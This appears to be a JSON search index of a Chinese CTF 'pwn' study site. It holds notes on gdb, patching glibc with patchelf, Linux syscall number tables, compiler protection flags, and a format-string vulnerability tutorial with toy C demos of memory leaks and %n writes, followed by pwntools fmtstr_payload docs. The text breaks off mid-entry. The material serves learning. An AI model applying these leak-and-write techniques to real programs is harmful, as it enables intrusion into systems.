{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction "},"pwn/":{"url":"pwn/","title":"pwn","keywords":"","body":""},"pwn/pwn基础/":{"url":"pwn/pwn基础/","title":"pwn基础","keywords":"","body":""},"pwn/pwn基础/gdb使用/gdb使用.html":{"url":"pwn/pwn基础/gdb使用/gdb使用.html","title":"gdb使用","keywords":"","body":" 命令 命令缩写 命令说明 set args 设置主程序的参数。例如：./book119 /oracle/c/book1.c /tmp/book1.c设置参数的方法是：(gdb) set args /oracle/c/book1.c /tmp/book1.c break b 设置断点，b 20 表示在第20行设置断点，可以设置多个断点。 run r 开始运行程序, 程序运行到断点的位置会停下来，如果没有遇到断点，程序一直运行下去。 next n 执行当前行语句，如果该语句为函数调用，不会进入函数内部执行。 step s 执行当前行语句，如果该语句为函数调用，则进入函数执行其中的第一条语句。注意了，如果函数是库函数或第三方提供的函数，用s也是进不去的，因为没有源代码，如果是您自定义的函数，只要有源码就可以进去。 print p 显示变量值，例如：p name表示显示变量name的值。 continue c 继续程序的运行，直到遇到下一个断点。 set var name=value 设置变量的值，假设程序有两个变量：int ii; char name[21];set var ii=10 把ii的值设置为10；set var name=\"西施\" 把name的值设置为\"西施\"，注意，不是strcpy。 quit q 退出gdb环境。 多进程调试 调试父进程： set follow-fork-mode parent (默认) 调试子进程： set follow-fork-mode child 调试模式： set detach-on-fork [on|off] ，默认是on on：表示调试当前进程时，其他进程继续运行 off：表示调试当前进程时，其他进程被gdb挂起 查看调试的进程：info inferiors 切换当前调试的进程：inferior [Num] "},"pwn/pwn基础/glibc更换_patchelf方法/glibc更换_patchelf方法.html":{"url":"pwn/pwn基础/glibc更换_patchelf方法/glibc更换_patchelf方法.html","title":"glibc更换_patchelf方法","keywords":"","body":"获取不同版本glibc版本方法 这里使用自动化工具 https://github.com/matrix1001/glibc-all-in-one 使用方法也很简单 先./update_list获取glibc列表 cat查看可以下载的glibc版本 $ cat list 2.23-0ubuntu11.2_amd64 2.23-0ubuntu11.2_i386 2.23-0ubuntu3_amd64 2.23-0ubuntu3_i386 2.27-3ubuntu1.2_amd64 2.27-3ubuntu1.2_i386 2.27-3ubuntu1.4_amd64 2.27-3ubuntu1.4_i386 2.27-3ubuntu1_amd64 2.27-3ubuntu1_i386 2.31-0ubuntu9.2_amd64 2.31-0ubuntu9.2_i386 2.31-0ubuntu9_amd64 2.31-0ubuntu9_i386 2.32-0ubuntu3.1_amd64 2.32-0ubuntu3.1_i386 2.32-0ubuntu3_amd64 2.32-0ubuntu3_i386 2.33-0ubuntu4_amd64 2.33-0ubuntu4_i386 ./download指定版本glibc即可下载，默认源是清华源，速度也很给力，并且符号表存入对应 libc 的 \".debug\" 文件夹中。 $ ./download 2.27-3ubuntu1.2_amd64 Getting 2.27-3ubuntu1.2_amd64 -> Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1.2_amd64.deb -> Downloading libc binary package -> Extracting libc binary package -> Package saved to libs/2.27-3ubuntu1.2_amd64 -> Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6-dbg_2.27-3ubuntu1.2_amd64.deb -> Downloading libc debug package -> Extracting libc debug package -> Package saved to libs/2.27-3ubuntu1.2_amd64/.debug 下载完glibc的文件夹在lib里面，链接器和动态库文件都在里面了。 patchelf改变程序链接器和动态库 https://github.com/NixOS/patchelf ./bootstrap.sh ./configure make make check sudo make install 可能会遇到 autoreconf: not found 安装一下就好啦 sudo apt-get install autoconf automake libtool 打patch方法，两种都可以 第一种，改变链接器+改变搜索路径 例子 patchelf --set-interpreter ./glibc-all-in-one-master/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so --set-rpath ./glibc-all-in-one-master/libs/2.31-0ubuntu9.2_amd64 target_file 第二种，改变链接器+直接改变动态库的路径 例子 patchelf --set-interpreter ./glibc-all-in-one-master/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so --replace-needed libc.so.6 ./glibc-all-in-one-master/libs/2.31-0ubuntu9.2_amd64/libc.so.6 target_file 个人感觉第一种会好一点，万一动态库有好多个，那第二种就需要手动一个一个设置了。 利用pwntools 例 p = process([\"ld.so\",\"./goal\"],env={\"LD_PRELOAD\":\"./libc-2.24.so\"}) 参考文章 https://bbs.pediy.com/thread-254868.htm "},"pwn/pwn基础/linux系统调用号查询/linux系统调用号查询.html":{"url":"pwn/pwn基础/linux系统调用号查询/linux系统调用号查询.html","title":"linux系统调用号查询","keywords":"","body":"在线查询网站，还挺全，各个架构都有 https://syscalls.w3challs.com/ 本机查询 32位 cat /usr/include/asm/unistd_32.h #ifndef _ASM_X86_UNISTD_32_H #define _ASM_X86_UNISTD_32_H 1 #define __NR_restart_syscall 0 #define __NR_exit 1 #define __NR_fork 2 #define __NR_read 3 #define __NR_write 4 #define __NR_open 5 #define __NR_close 6 #define __NR_waitpid 7 #define __NR_creat 8 #define __NR_link 9 #define __NR_unlink 10 #define __NR_execve 11 #define __NR_chdir 12 #define __NR_time 13 #define __NR_mknod 14 #define __NR_chmod 15 #define __NR_lchown 16 #define __NR_break 17 #define __NR_oldstat 18 #define __NR_lseek 19 #define __NR_getpid 20 #define __NR_mount 21 #define __NR_umount 22 #define __NR_setuid 23 #define __NR_getuid 24 #define __NR_stime 25 #define __NR_ptrace 26 #define __NR_alarm 27 #define __NR_oldfstat 28 #define __NR_pause 29 #define __NR_utime 30 #define __NR_stty 31 #define __NR_gtty 32 #define __NR_access 33 #define __NR_nice 34 #define __NR_ftime 35 #define __NR_sync 36 #define __NR_kill 37 #define __NR_rename 38 #define __NR_mkdir 39 #define __NR_rmdir 40 #define __NR_dup 41 #define __NR_pipe 42 #define __NR_times 43 #define __NR_prof 44 #define __NR_brk 45 #define __NR_setgid 46 #define __NR_getgid 47 #define __NR_signal 48 #define __NR_geteuid 49 #define __NR_getegid 50 #define __NR_acct 51 #define __NR_umount2 52 #define __NR_lock 53 #define __NR_ioctl 54 #define __NR_fcntl 55 #define __NR_mpx 56 #define __NR_setpgid 57 #define __NR_ulimit 58 #define __NR_oldolduname 59 #define __NR_umask 60 #define __NR_chroot 61 #define __NR_ustat 62 #define __NR_dup2 63 #define __NR_getppid 64 #define __NR_getpgrp 65 #define __NR_setsid 66 #define __NR_sigaction 67 #define __NR_sgetmask 68 #define __NR_ssetmask 69 #define __NR_setreuid 70 #define __NR_setregid 71 #define __NR_sigsuspend 72 #define __NR_sigpending 73 #define __NR_sethostname 74 #define __NR_setrlimit 75 #define __NR_getrlimit 76 #define __NR_getrusage 77 #define __NR_gettimeofday 78 #define __NR_settimeofday 79 #define __NR_getgroups 80 #define __NR_setgroups 81 #define __NR_select 82 #define __NR_symlink 83 #define __NR_oldlstat 84 #define __NR_readlink 85 #define __NR_uselib 86 #define __NR_swapon 87 #define __NR_reboot 88 #define __NR_readdir 89 #define __NR_mmap 90 #define __NR_munmap 91 #define __NR_truncate 92 #define __NR_ftruncate 93 #define __NR_fchmod 94 #define __NR_fchown 95 #define __NR_getpriority 96 #define __NR_setpriority 97 #define __NR_profil 98 #define __NR_statfs 99 #define __NR_fstatfs 100 #define __NR_ioperm 101 #define __NR_socketcall 102 #define __NR_syslog 103 #define __NR_setitimer 104 #define __NR_getitimer 105 #define __NR_stat 106 #define __NR_lstat 107 #define __NR_fstat 108 #define __NR_olduname 109 #define __NR_iopl 110 #define __NR_vhangup 111 #define __NR_idle 112 #define __NR_vm86old 113 #define __NR_wait4 114 #define __NR_swapoff 115 #define __NR_sysinfo 116 #define __NR_ipc 117 #define __NR_fsync 118 #define __NR_sigreturn 119 #define __NR_clone 120 #define __NR_setdomainname 121 #define __NR_uname 122 #define __NR_modify_ldt 123 #define __NR_adjtimex 124 #define __NR_mprotect 125 #define __NR_sigprocmask 126 #define __NR_create_module 127 #define __NR_init_module 128 #define __NR_delete_module 129 #define __NR_get_kernel_syms 130 #define __NR_quotactl 131 #define __NR_getpgid 132 #define __NR_fchdir 133 #define __NR_bdflush 134 #define __NR_sysfs 135 #define __NR_personality 136 #define __NR_afs_syscall 137 #define __NR_setfsuid 138 #define __NR_setfsgid 139 #define __NR__llseek 140 #define __NR_getdents 141 #define __NR__newselect 142 #define __NR_flock 143 #define __NR_msync 144 #define __NR_readv 145 #define __NR_writev 146 #define __NR_getsid 147 #define __NR_fdatasync 148 #define __NR__sysctl 149 #define __NR_mlock 150 #define __NR_munlock 151 #define __NR_mlockall 152 #define __NR_munlockall 153 #define __NR_sched_setparam 154 #define __NR_sched_getparam 155 #define __NR_sched_setscheduler 156 #define __NR_sched_getscheduler 157 #define __NR_sched_yield 158 #define __NR_sched_get_priority_max 159 #define __NR_sched_get_priority_min 160 #define __NR_sched_rr_get_interval 161 #define __NR_nanosleep 162 #define __NR_mremap 163 #define __NR_setresuid 164 #define __NR_getresuid 165 #define __NR_vm86 166 #define __NR_query_module 167 #define __NR_poll 168 #define __NR_nfsservctl 169 #define __NR_setresgid 170 #define __NR_getresgid 171 #define __NR_prctl 172 #define __NR_rt_sigreturn 173 #define __NR_rt_sigaction 174 #define __NR_rt_sigprocmask 175 #define __NR_rt_sigpending 176 #define __NR_rt_sigtimedwait 177 #define __NR_rt_sigqueueinfo 178 #define __NR_rt_sigsuspend 179 #define __NR_pread64 180 #define __NR_pwrite64 181 #define __NR_chown 182 #define __NR_getcwd 183 #define __NR_capget 184 #define __NR_capset 185 #define __NR_sigaltstack 186 #define __NR_sendfile 187 #define __NR_getpmsg 188 #define __NR_putpmsg 189 #define __NR_vfork 190 #define __NR_ugetrlimit 191 #define __NR_mmap2 192 #define __NR_truncate64 193 #define __NR_ftruncate64 194 #define __NR_stat64 195 #define __NR_lstat64 196 #define __NR_fstat64 197 #define __NR_lchown32 198 #define __NR_getuid32 199 #define __NR_getgid32 200 #define __NR_geteuid32 201 #define __NR_getegid32 202 #define __NR_setreuid32 203 #define __NR_setregid32 204 #define __NR_getgroups32 205 #define __NR_setgroups32 206 #define __NR_fchown32 207 #define __NR_setresuid32 208 #define __NR_getresuid32 209 #define __NR_setresgid32 210 #define __NR_getresgid32 211 #define __NR_chown32 212 #define __NR_setuid32 213 #define __NR_setgid32 214 #define __NR_setfsuid32 215 #define __NR_setfsgid32 216 #define __NR_pivot_root 217 #define __NR_mincore 218 #define __NR_madvise 219 #define __NR_getdents64 220 #define __NR_fcntl64 221 #define __NR_gettid 224 #define __NR_readahead 225 #define __NR_setxattr 226 #define __NR_lsetxattr 227 #define __NR_fsetxattr 228 #define __NR_getxattr 229 #define __NR_lgetxattr 230 #define __NR_fgetxattr 231 #define __NR_listxattr 232 #define __NR_llistxattr 233 #define __NR_flistxattr 234 #define __NR_removexattr 235 #define __NR_lremovexattr 236 #define __NR_fremovexattr 237 #define __NR_tkill 238 #define __NR_sendfile64 239 #define __NR_futex 240 #define __NR_sched_setaffinity 241 #define __NR_sched_getaffinity 242 #define __NR_set_thread_area 243 #define __NR_get_thread_area 244 #define __NR_io_setup 245 #define __NR_io_destroy 246 #define __NR_io_getevents 247 #define __NR_io_submit 248 #define __NR_io_cancel 249 #define __NR_fadvise64 250 #define __NR_exit_group 252 #define __NR_lookup_dcookie 253 #define __NR_epoll_create 254 #define __NR_epoll_ctl 255 #define __NR_epoll_wait 256 #define __NR_remap_file_pages 257 #define __NR_set_tid_address 258 #define __NR_timer_create 259 #define __NR_timer_settime 260 #define __NR_timer_gettime 261 #define __NR_timer_getoverrun 262 #define __NR_timer_delete 263 #define __NR_clock_settime 264 #define __NR_clock_gettime 265 #define __NR_clock_getres 266 #define __NR_clock_nanosleep 267 #define __NR_statfs64 268 #define __NR_fstatfs64 269 #define __NR_tgkill 270 #define __NR_utimes 271 #define __NR_fadvise64_64 272 #define __NR_vserver 273 #define __NR_mbind 274 #define __NR_get_mempolicy 275 #define __NR_set_mempolicy 276 #define __NR_mq_open 277 #define __NR_mq_unlink 278 #define __NR_mq_timedsend 279 #define __NR_mq_timedreceive 280 #define __NR_mq_notify 281 #define __NR_mq_getsetattr 282 #define __NR_kexec_load 283 #define __NR_waitid 284 #define __NR_add_key 286 #define __NR_request_key 287 #define __NR_keyctl 288 #define __NR_ioprio_set 289 #define __NR_ioprio_get 290 #define __NR_inotify_init 291 #define __NR_inotify_add_watch 292 #define __NR_inotify_rm_watch 293 #define __NR_migrate_pages 294 #define __NR_openat 295 #define __NR_mkdirat 296 #define __NR_mknodat 297 #define __NR_fchownat 298 #define __NR_futimesat 299 #define __NR_fstatat64 300 #define __NR_unlinkat 301 #define __NR_renameat 302 #define __NR_linkat 303 #define __NR_symlinkat 304 #define __NR_readlinkat 305 #define __NR_fchmodat 306 #define __NR_faccessat 307 #define __NR_pselect6 308 #define __NR_ppoll 309 #define __NR_unshare 310 #define __NR_set_robust_list 311 #define __NR_get_robust_list 312 #define __NR_splice 313 #define __NR_sync_file_range 314 #define __NR_tee 315 #define __NR_vmsplice 316 #define __NR_move_pages 317 #define __NR_getcpu 318 #define __NR_epoll_pwait 319 #define __NR_utimensat 320 #define __NR_signalfd 321 #define __NR_timerfd_create 322 #define __NR_eventfd 323 #define __NR_fallocate 324 #define __NR_timerfd_settime 325 #define __NR_timerfd_gettime 326 #define __NR_signalfd4 327 #define __NR_eventfd2 328 #define __NR_epoll_create1 329 #define __NR_dup3 330 #define __NR_pipe2 331 #define __NR_inotify_init1 332 #define __NR_preadv 333 #define __NR_pwritev 334 #define __NR_rt_tgsigqueueinfo 335 #define __NR_perf_event_open 336 #define __NR_recvmmsg 337 #define __NR_fanotify_init 338 #define __NR_fanotify_mark 339 #define __NR_prlimit64 340 #define __NR_name_to_handle_at 341 #define __NR_open_by_handle_at 342 #define __NR_clock_adjtime 343 #define __NR_syncfs 344 #define __NR_sendmmsg 345 #define __NR_setns 346 #define __NR_process_vm_readv 347 #define __NR_process_vm_writev 348 #define __NR_kcmp 349 #define __NR_finit_module 350 #define __NR_sched_setattr 351 #define __NR_sched_getattr 352 #define __NR_renameat2 353 #define __NR_seccomp 354 #define __NR_getrandom 355 #define __NR_memfd_create 356 #define __NR_bpf 357 #define __NR_execveat 358 #define __NR_socket 359 #define __NR_socketpair 360 #define __NR_bind 361 #define __NR_connect 362 #define __NR_listen 363 #define __NR_accept4 364 #define __NR_getsockopt 365 #define __NR_setsockopt 366 #define __NR_getsockname 367 #define __NR_getpeername 368 #define __NR_sendto 369 #define __NR_sendmsg 370 #define __NR_recvfrom 371 #define __NR_recvmsg 372 #define __NR_shutdown 373 #define __NR_userfaultfd 374 #define __NR_membarrier 375 #define __NR_mlock2 376 #define __NR_copy_file_range 377 #define __NR_preadv2 378 #define __NR_pwritev2 379 #define __NR_pkey_mprotect 380 #define __NR_pkey_alloc 381 #define __NR_pkey_free 382 #define __NR_statx 383 #define __NR_arch_prctl 384 #endif /* _ASM_X86_UNISTD_32_H */ 64位 cat /usr/include/asm/unistd_64.h #ifndef _ASM_X86_UNISTD_64_H #define _ASM_X86_UNISTD_64_H 1 #define __NR_read 0 #define __NR_write 1 #define __NR_open 2 #define __NR_close 3 #define __NR_stat 4 #define __NR_fstat 5 #define __NR_lstat 6 #define __NR_poll 7 #define __NR_lseek 8 #define __NR_mmap 9 #define __NR_mprotect 10 #define __NR_munmap 11 #define __NR_brk 12 #define __NR_rt_sigaction 13 #define __NR_rt_sigprocmask 14 #define __NR_rt_sigreturn 15 #define __NR_ioctl 16 #define __NR_pread64 17 #define __NR_pwrite64 18 #define __NR_readv 19 #define __NR_writev 20 #define __NR_access 21 #define __NR_pipe 22 #define __NR_select 23 #define __NR_sched_yield 24 #define __NR_mremap 25 #define __NR_msync 26 #define __NR_mincore 27 #define __NR_madvise 28 #define __NR_shmget 29 #define __NR_shmat 30 #define __NR_shmctl 31 #define __NR_dup 32 #define __NR_dup2 33 #define __NR_pause 34 #define __NR_nanosleep 35 #define __NR_getitimer 36 #define __NR_alarm 37 #define __NR_setitimer 38 #define __NR_getpid 39 #define __NR_sendfile 40 #define __NR_socket 41 #define __NR_connect 42 #define __NR_accept 43 #define __NR_sendto 44 #define __NR_recvfrom 45 #define __NR_sendmsg 46 #define __NR_recvmsg 47 #define __NR_shutdown 48 #define __NR_bind 49 #define __NR_listen 50 #define __NR_getsockname 51 #define __NR_getpeername 52 #define __NR_socketpair 53 #define __NR_setsockopt 54 #define __NR_getsockopt 55 #define __NR_clone 56 #define __NR_fork 57 #define __NR_vfork 58 #define __NR_execve 59 #define __NR_exit 60 #define __NR_wait4 61 #define __NR_kill 62 #define __NR_uname 63 #define __NR_semget 64 #define __NR_semop 65 #define __NR_semctl 66 #define __NR_shmdt 67 #define __NR_msgget 68 #define __NR_msgsnd 69 #define __NR_msgrcv 70 #define __NR_msgctl 71 #define __NR_fcntl 72 #define __NR_flock 73 #define __NR_fsync 74 #define __NR_fdatasync 75 #define __NR_truncate 76 #define __NR_ftruncate 77 #define __NR_getdents 78 #define __NR_getcwd 79 #define __NR_chdir 80 #define __NR_fchdir 81 #define __NR_rename 82 #define __NR_mkdir 83 #define __NR_rmdir 84 #define __NR_creat 85 #define __NR_link 86 #define __NR_unlink 87 #define __NR_symlink 88 #define __NR_readlink 89 #define __NR_chmod 90 #define __NR_fchmod 91 #define __NR_chown 92 #define __NR_fchown 93 #define __NR_lchown 94 #define __NR_umask 95 #define __NR_gettimeofday 96 #define __NR_getrlimit 97 #define __NR_getrusage 98 #define __NR_sysinfo 99 #define __NR_times 100 #define __NR_ptrace 101 #define __NR_getuid 102 #define __NR_syslog 103 #define __NR_getgid 104 #define __NR_setuid 105 #define __NR_setgid 106 #define __NR_geteuid 107 #define __NR_getegid 108 #define __NR_setpgid 109 #define __NR_getppid 110 #define __NR_getpgrp 111 #define __NR_setsid 112 #define __NR_setreuid 113 #define __NR_setregid 114 #define __NR_getgroups 115 #define __NR_setgroups 116 #define __NR_setresuid 117 #define __NR_getresuid 118 #define __NR_setresgid 119 #define __NR_getresgid 120 #define __NR_getpgid 121 #define __NR_setfsuid 122 #define __NR_setfsgid 123 #define __NR_getsid 124 #define __NR_capget 125 #define __NR_capset 126 #define __NR_rt_sigpending 127 #define __NR_rt_sigtimedwait 128 #define __NR_rt_sigqueueinfo 129 #define __NR_rt_sigsuspend 130 #define __NR_sigaltstack 131 #define __NR_utime 132 #define __NR_mknod 133 #define __NR_uselib 134 #define __NR_personality 135 #define __NR_ustat 136 #define __NR_statfs 137 #define __NR_fstatfs 138 #define __NR_sysfs 139 #define __NR_getpriority 140 #define __NR_setpriority 141 #define __NR_sched_setparam 142 #define __NR_sched_getparam 143 #define __NR_sched_setscheduler 144 #define __NR_sched_getscheduler 145 #define __NR_sched_get_priority_max 146 #define __NR_sched_get_priority_min 147 #define __NR_sched_rr_get_interval 148 #define __NR_mlock 149 #define __NR_munlock 150 #define __NR_mlockall 151 #define __NR_munlockall 152 #define __NR_vhangup 153 #define __NR_modify_ldt 154 #define __NR_pivot_root 155 #define __NR__sysctl 156 #define __NR_prctl 157 #define __NR_arch_prctl 158 #define __NR_adjtimex 159 #define __NR_setrlimit 160 #define __NR_chroot 161 #define __NR_sync 162 #define __NR_acct 163 #define __NR_settimeofday 164 #define __NR_mount 165 #define __NR_umount2 166 #define __NR_swapon 167 #define __NR_swapoff 168 #define __NR_reboot 169 #define __NR_sethostname 170 #define __NR_setdomainname 171 #define __NR_iopl 172 #define __NR_ioperm 173 #define __NR_create_module 174 #define __NR_init_module 175 #define __NR_delete_module 176 #define __NR_get_kernel_syms 177 #define __NR_query_module 178 #define __NR_quotactl 179 #define __NR_nfsservctl 180 #define __NR_getpmsg 181 #define __NR_putpmsg 182 #define __NR_afs_syscall 183 #define __NR_tuxcall 184 #define __NR_security 185 #define __NR_gettid 186 #define __NR_readahead 187 #define __NR_setxattr 188 #define __NR_lsetxattr 189 #define __NR_fsetxattr 190 #define __NR_getxattr 191 #define __NR_lgetxattr 192 #define __NR_fgetxattr 193 #define __NR_listxattr 194 #define __NR_llistxattr 195 #define __NR_flistxattr 196 #define __NR_removexattr 197 #define __NR_lremovexattr 198 #define __NR_fremovexattr 199 #define __NR_tkill 200 #define __NR_time 201 #define __NR_futex 202 #define __NR_sched_setaffinity 203 #define __NR_sched_getaffinity 204 #define __NR_set_thread_area 205 #define __NR_io_setup 206 #define __NR_io_destroy 207 #define __NR_io_getevents 208 #define __NR_io_submit 209 #define __NR_io_cancel 210 #define __NR_get_thread_area 211 #define __NR_lookup_dcookie 212 #define __NR_epoll_create 213 #define __NR_epoll_ctl_old 214 #define __NR_epoll_wait_old 215 #define __NR_remap_file_pages 216 #define __NR_getdents64 217 #define __NR_set_tid_address 218 #define __NR_restart_syscall 219 #define __NR_semtimedop 220 #define __NR_fadvise64 221 #define __NR_timer_create 222 #define __NR_timer_settime 223 #define __NR_timer_gettime 224 #define __NR_timer_getoverrun 225 #define __NR_timer_delete 226 #define __NR_clock_settime 227 #define __NR_clock_gettime 228 #define __NR_clock_getres 229 #define __NR_clock_nanosleep 230 #define __NR_exit_group 231 #define __NR_epoll_wait 232 #define __NR_epoll_ctl 233 #define __NR_tgkill 234 #define __NR_utimes 235 #define __NR_vserver 236 #define __NR_mbind 237 #define __NR_set_mempolicy 238 #define __NR_get_mempolicy 239 #define __NR_mq_open 240 #define __NR_mq_unlink 241 #define __NR_mq_timedsend 242 #define __NR_mq_timedreceive 243 #define __NR_mq_notify 244 #define __NR_mq_getsetattr 245 #define __NR_kexec_load 246 #define __NR_waitid 247 #define __NR_add_key 248 #define __NR_request_key 249 #define __NR_keyctl 250 #define __NR_ioprio_set 251 #define __NR_ioprio_get 252 #define __NR_inotify_init 253 #define __NR_inotify_add_watch 254 #define __NR_inotify_rm_watch 255 #define __NR_migrate_pages 256 #define __NR_openat 257 #define __NR_mkdirat 258 #define __NR_mknodat 259 #define __NR_fchownat 260 #define __NR_futimesat 261 #define __NR_newfstatat 262 #define __NR_unlinkat 263 #define __NR_renameat 264 #define __NR_linkat 265 #define __NR_symlinkat 266 #define __NR_readlinkat 267 #define __NR_fchmodat 268 #define __NR_faccessat 269 #define __NR_pselect6 270 #define __NR_ppoll 271 #define __NR_unshare 272 #define __NR_set_robust_list 273 #define __NR_get_robust_list 274 #define __NR_splice 275 #define __NR_tee 276 #define __NR_sync_file_range 277 #define __NR_vmsplice 278 #define __NR_move_pages 279 #define __NR_utimensat 280 #define __NR_epoll_pwait 281 #define __NR_signalfd 282 #define __NR_timerfd_create 283 #define __NR_eventfd 284 #define __NR_fallocate 285 #define __NR_timerfd_settime 286 #define __NR_timerfd_gettime 287 #define __NR_accept4 288 #define __NR_signalfd4 289 #define __NR_eventfd2 290 #define __NR_epoll_create1 291 #define __NR_dup3 292 #define __NR_pipe2 293 #define __NR_inotify_init1 294 #define __NR_preadv 295 #define __NR_pwritev 296 #define __NR_rt_tgsigqueueinfo 297 #define __NR_perf_event_open 298 #define __NR_recvmmsg 299 #define __NR_fanotify_init 300 #define __NR_fanotify_mark 301 #define __NR_prlimit64 302 #define __NR_name_to_handle_at 303 #define __NR_open_by_handle_at 304 #define __NR_clock_adjtime 305 #define __NR_syncfs 306 #define __NR_sendmmsg 307 #define __NR_setns 308 #define __NR_getcpu 309 #define __NR_process_vm_readv 310 #define __NR_process_vm_writev 311 #define __NR_kcmp 312 #define __NR_finit_module 313 #define __NR_sched_setattr 314 #define __NR_sched_getattr 315 #define __NR_renameat2 316 #define __NR_seccomp 317 #define __NR_getrandom 318 #define __NR_memfd_create 319 #define __NR_kexec_file_load 320 #define __NR_bpf 321 #define __NR_execveat 322 #define __NR_userfaultfd 323 #define __NR_membarrier 324 #define __NR_mlock2 325 #define __NR_copy_file_range 326 #define __NR_preadv2 327 #define __NR_pwritev2 328 #define __NR_pkey_mprotect 329 #define __NR_pkey_alloc 330 #define __NR_pkey_free 331 #define __NR_statx 332 #endif /* _ASM_X86_UNISTD_64_H */ "},"pwn/pwn基础/pwn题编译时的保护选项/pwn题编译时的保护选项.html":{"url":"pwn/pwn基础/pwn题编译时的保护选项/pwn题编译时的保护选项.html","title":"pwn题编译时的保护选项","keywords":"","body":"NX：-z execstack / -z noexecstack (关闭 / 开启) 不让执行栈上的数据，于是JMP ESP就不能用了 Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) 栈里插入cookie信息 ASLR和PIE：-no-pie / -pie (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限 "},"pwn/fmt/fmt/fmt.html":{"url":"pwn/fmt/fmt/fmt.html","title":"fmt","keywords":"","body":"fmt（格式化字符串漏洞） 格式化字符串函数介绍 格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来输出信息，调试程序，或者处理字符串。 常见的有格式化字符串函数有 输入 scanf 输出 函数 基本介绍 printf 输出到 stdout fprintf 输出到指定 FILE 流 vprintf 根据参数列表格式化输出到 stdout vfprintf 根据参数列表格式化输出到指定 FILE 流 sprintf 输出到字符串 snprintf 输出指定字节数到字符串 vsprintf 根据参数列表格式化输出到字符串 vsnprintf 根据参数列表格式化输出指定字节到字符串 setproctitle 设置 argv syslog 输出日志 err, verr, warn, vwarn 等 。。。 格式化字符串 这里我们了解一下格式化字符串的格式，其基本格式如下 %[parameter][flags][field width][.precision][length]type 每一种 pattern 的含义请具体参考维基百科的格式化字符串 。以下几个 pattern 中的对应选择需要重点关注 parameter n$，获取格式化字符串中的指定参数 flag field width 输出的最小宽度 precision 输出的最大长度 length，输出的长度 hh，输出一个字节 h，输出一个双字节 type d/i，有符号整数 u，无符号整数 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。 o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。 s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。 c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。 p， void * 型，输出对应变量的值。printf(\"%p\",a) 用地址的格式打印变量 a 的值，printf(\"%p\", &a) 打印变量 a 所在的地址。 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 %， '%'字面值，不接受任何 flags, width。 正常使用时的演示程序 32位演示 源文件test1.c #include int main(){ char *temp = \"hello!this is a simple test!\"; printf(\"num1:%d\\nnum2:%d\\nnum3:%d\\nnum4:%d\\nnum5:%d\\nnum6:%d\\nnum7:%d\\nstring in temp:%s\",1,2,3,4,5,6,7,temp); return 0; } 编译 gcc -g test1.c -o test1 -no-pie -m32 执行到printf时栈上的情况 64位演示 源文件同上 编译 gcc -g test1.c -o test1 -no-pie 执行到printf时栈上和寄存器的情况 hhn和hn #include int main(){ int a = 0x12345678; printf(\"%d,%hd,%hhd \\n\",a,a,a); return 0; } 运行结果 fmt例1（内存泄露） test2.c #include int main(){ printf(\"%x-%x-%x-%x\"); return 0; } 编译 gcc -g test2.c -o test2 -no-pie 运行结果 fmt例2（指定参数泄露） #include int main(){ int a=1,b=2,c=3,d=4,e=5; printf(\"%1$d---%3$d\\n\",a,b,c,d,e); return 0; } 编译 gcc -g test2.c -o test2 -no-pie 运行结果 fmt例3（内存修改） #include int main(){ int n = 1; printf(\"aaaa%n\\n\",&n); printf(\"n=%d\\n\",n); return 0; } 编译 gcc -g test2.c -o test2 -no-pie 运行结果 fmt字符串漏洞的作用：泄露内存信息（栈上信息、程序pie偏移、cannary）、任意地址写入。 "},"pwn/fmt/fmtstr模块/fmtstr模块.html":{"url":"pwn/fmt/fmtstr模块/fmtstr模块.html","title":"fmtstr模块","keywords":"","body":"格式化字符串漏洞如果要修改某个内存地址的内容常常需要构造比较长的payload，手撸当然也可以，但比较耗时，容易出错，pwntools里的pwnlib.fmtstr模块用起来比较方便，不容易出错，所以记录一下以便以后能够更快的写exp。 pwntools pwnlib.fmtstr模块提供了一些字符串漏洞利用的工具。该模块中定义了一个类FmtStr和一个函数fmtstr_payload。 FmtStr提供了自动化的字符串漏洞利用。 class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0) execute_fmt(function)：与漏洞进程进行交互的函数； offset(int)：控制的第一个格式化程序的偏移量 padlen(int)：在payload之前添加的pad的大小 numbwritten(int)：已经写入的字节数 fmtstr_payload用于自动生成格式化字符串payload pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') offset(int)：控制的第一个格式化程序的偏移量 writes(dic)：格式为{addr:value , addr2:value2}，用于往addr里写入value的值 numbwritten(int)：已经由printf函数写入的字节数 write_size(str)：必须是byte、short或int。（hhn，hn，n） fmtstr_payload python文档 Help on function fmtstr_payload in module pwnlib.fmtstr: fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_max='long', overflows=16, strategy='small', badbytes=frozenset([]), offset_bytes=0) fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') -> str Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from ``context.bits`` The overflows argument is a format-string-length to output-amount tradeoff: Larger values for ``overflows`` produce shorter format strings that generate more output at runtime. Arguments: offset(int): the first formatter's offset you control writes(dict): dict with addr, value ``{addr: value, addr2: 